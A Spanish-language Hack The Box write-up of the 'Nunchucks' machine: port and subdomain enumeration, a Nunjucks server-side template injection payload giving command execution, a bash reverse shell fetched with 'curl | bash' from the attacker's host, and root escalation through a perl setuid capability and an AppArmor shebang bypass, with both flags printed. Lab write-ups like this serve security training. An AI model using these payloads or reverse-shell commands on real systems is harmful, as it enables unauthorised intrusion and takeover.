---
layout: post
title: Nunchucks
date: 2023-06-09
description:
img:
fig-caption:
tags: [eWPT]
---
___

<center><img src="/writeups/assets/img/NunChucks-htb/Nunchucks.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* SSTI - NodeJS - RCE

* Abuso de Shebang - Bypass AppArmor

* Abuso de Capability (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.122 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 15:20 GMT
Nmap scan report for 10.10.11.122
Host is up (0.092s latency).
Not shown: 36738 closed tcp ports (reset), 28794 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 22.56 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,443 10.10.11.122 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 15:22 GMT
Nmap scan report for 10.10.11.122
Host is up (0.65s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c146dbb7459c3782e48f511d85b4721 (RSA)
|   256 a2f42c427465a37c26dd497223827271 (ECDSA)
|_  256 e18d44e7216d7c132fea3b8358aa02b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_http-title: Nunchucks - Landing Page
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.95 seconds
```

Agrego el dominio ```nunchucks.htb``` al ```/etc/hosts```

## Puerto 80,443 (HTTP, HTTPS)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.122
http://10.10.11.122 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], RedirectLocation[https://nunchucks.htb/], Title[301 Moved Permanently], nginx[1.18.0]
https://nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/NunChucks-htb/1.png" alt="">

Es muy estática, así que utilizo ```wfuzz``` para enumerar subdominios

```null
wfuzz -c -t 200 --hh=30587 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nunchucks.htb" https://nunchucks.htb/
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000081:   200        101 L    259 W      4028 Ch     "store"                                                                                                                                        

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Agrego ```store.nunchucks.htb``` al ```/etc/hosts```. Por ```HTTPS``` tiene el siguiente aspecto:

<img src="/writeups/assets/img/NunChucks-htb/2.png" alt="">

Al introducir cualquier correo, el input se ve reflejado en el output

<img src="/writeups/assets/img/NunChucks-htb/3.png" alt="">

Es vulnerable a SSTI en ```Node.js```. En este [artículo](https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) explican como explotarlo. Hago una pequeña operatoria a modo de traza

<img src="/writeups/assets/img/NunChucks-htb/4.png" alt="">

Intercepto la petición con ```BurpSuite``` y ahí introduzco el payload en el campo ```email```

{%raw%}
```null
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"}
```
{%endraw%}

En la respuesta se ve el comando ejecutado

{%raw%}
```null
{"response":"You will receive updates on the following email address: uid=1000(david) gid=1000(david) groups=1000(david)\n."}
```
{%endraw%}

Creo un archivo ```index.html``` que a la hora de compartirlo e interpretarlo me envíe una reverse shell

```null
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'
```

Utilizo un servicio HTTP con python para hostearlo

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.122 - - [15/Jun/2023 09:11:49] "GET / HTTP/1.1" 200 -
```

{%raw%}
```null
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl 10.10.16.6 | bash')\")()}}"}
```
{%endraw%}

Recibo la conexión en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.122] 54654
bash: cannot set terminal process group (1028): Inappropriate ioctl for device
bash: no job control in this shell
david@nunchucks:/var/www/store.nunchucks$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
david@nunchucks:/var/www/store.nunchucks$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
david@nunchucks:/var/www/store.nunchucks$ export TERM=xterm
david@nunchucks:/var/www/store.nunchucks$ export SHELL=bash
david@nunchucks:/var/www/store.nunchucks$ stty rows 55 columns 209
```

Puedo ver la primera flag

```null
david@nunchucks:~$ cat user.txt 
f7999d0ce514afe23b234b05ec004569
```

# Escalada

El comando ```perl``` tiene la capabiity ```cap_setuid+ep```

```null
david@nunchucks:/$ getcap -r / 2>/dev/null 
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

En [GTFObins](https://gtfobins.github.io/gtfobins/perl/#capabilities) explican la forma de abusar de esta propiedad

<img src="/writeups/assets/img/NunChucks-htb/5.png" alt="">

No puedo spawnear directamente una ```bash```, pero sí ejecutar comandos

```null
david@nunchucks:/$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
root
```

Aunque hay restricciones, como no poder abrir archivos

```null
david@nunchucks:/$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cat /root/root.txt";'
cat: /root/root.txt: Permission denied
```

Es probable que se esté empleando ```SELinux``` o similares. En el directorio ```/etc``` se encuentran los archivos de configuración de ```apparmor```

```null
david@nunchucks:/etc/apparmor.d$ ls -la
total 72
drwxr-xr-x   7 root root  4096 Oct 28  2021 .
drwxr-xr-x 125 root root 12288 Jun 15 08:53 ..
drwxr-xr-x   4 root root  4096 Oct 28  2021 abstractions
drwxr-xr-x   2 root root  4096 Oct 28  2021 disable
drwxr-xr-x   2 root root  4096 Oct 28  2021 force-complain
drwxr-xr-x   2 root root  4096 Oct 28  2021 local
-rw-r--r--   1 root root  1313 May 19  2020 lsb_release
-rw-r--r--   1 root root  1108 May 19  2020 nvidia_modprobe
-rw-r--r--   1 root root  3222 Mar 11  2020 sbin.dhclient
drwxr-xr-x   5 root root  4096 Oct 28  2021 tunables
-rw-r--r--   1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r--   1 root root   442 Sep 26  2021 usr.bin.perl
-rw-r--r--   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r--   1 root root  2006 Jul 22  2021 usr.sbin.mysqld
-rw-r--r--   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r--   1 root root  1385 Dec  7  2019 usr.sbin.tcpdump
```

Si abro el de ```perl``` puedo ver como se está incorporando un script customizado que se encuentra en ```/opt```

```null
david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}
```

Se está modificando el UID para que sea el de ```root```

```null
david@nunchucks:/etc/apparmor.d$ cat /opt/backup.pl
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0); 

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```

No tengo capacidad de escritura

```null
david@nunchucks:/etc/apparmor.d$ ls -l /opt/backup.pl 
-rwxr-xr-x 1 root root 838 Sep  1  2021 /opt/backup.pl
```

En este [artículo](https://bugs.launchpad.net/apparmor/+bug/1911431) explican un fallo de seguridad para ```apparmor```. Creo un script que abuse del ```shebang``` de ```perl``` para spawnear una ```bash```

```null
david@nunchucks:/tmp$ chmod +x test 
```

Puedo ver la segunda flag

```null
david@nunchucks:/tmp$ ./test 
root@nunchucks:/tmp# cat /root/root.txt 
56ebe2804657820240c5c690265cc136
```